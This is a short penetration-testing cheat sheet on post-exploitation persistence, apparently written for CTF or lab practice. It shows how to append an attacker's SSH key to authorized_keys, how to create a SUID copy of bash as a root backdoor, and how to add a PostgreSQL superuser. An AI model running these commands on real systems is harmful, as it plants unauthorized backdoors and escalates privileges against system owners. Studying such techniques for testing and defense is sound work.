# Persistence

## authorized\_keys file

{% code overflow="wrap" %}
```bash
# Ensure authorized_keys has 644 permissions if creating
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYU7cbck9dVt4TqiUWftp+wDvN0/Xoi85L9BV+nkodZA+SCQcjjGcuWxWfuVwCyHKdyeIX8AfLKXvB1QyMGQedgcakZmsUxfoFA99bT5ww36bQKVTk+Rg3bAOlkh2TrO9bmNfpzAZM2UduEXOYyxrKYlauAyj33ei9NHDS9tZ0+WEuSMPhkJ638kd/JMRNxIa4YdQ47rMKVmxgnFZUXxITF18od/MWuKfDnyK8qkoghV/iQkPQafLmzVFOOPyzMq/2uXl/zo62NQndNR0ay212pC7+csJC9xJuEOwRNku19beCF9E1Urh2y8IVdxIaaz8KocC/b97HxzAlFXfDdOnTEUqIttmXlnuxgnKjxeIumLAjzeYpviKxRAPZhvN7gBLcfS7FYSiIoGmJM5CIveCAuqIJXYXswCBMgw+CiuymDe41hL2JjTqJplVeS6lYBnUtt/QSnVaI2hxxkNGIsDYFs9dvslwJKRi4J/4/ELXkDkk/RtbClAmPBCsIUhfp9H8= kali@kali" >> authorized_keys
```
{% endcode %}

## rootbash

* Run the following commands with root to create a reusable root privsec

```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

## Generating an SSH keypair

```bash
ssh-keygen
```

## PostgreSQL

<table><thead><tr><th width="287">Info</th><th>Command</th></tr></thead><tbody><tr><td>Connect to postgres</td><td><code>psql -h $ip -U postgres</code></td></tr><tr><td>List the databases</td><td><code>\l</code></td></tr><tr><td>Connect to a database</td><td><code>\c flag</code></td></tr><tr><td>Enumerate tables</td><td><code>\d</code></td></tr><tr><td>View table contents</td><td><code>select * from flag;</code></td></tr><tr><td>Enumerate PostreSQL Users</td><td><code>\du</code></td></tr><tr><td>Create a user</td><td><code>CREATE user test WITH PASSWORD 'password';</code></td></tr><tr><td>Assign superuser role to newly created user</td><td><code>ALTER USER test WITH SUPERUSER</code></td></tr></tbody></table>

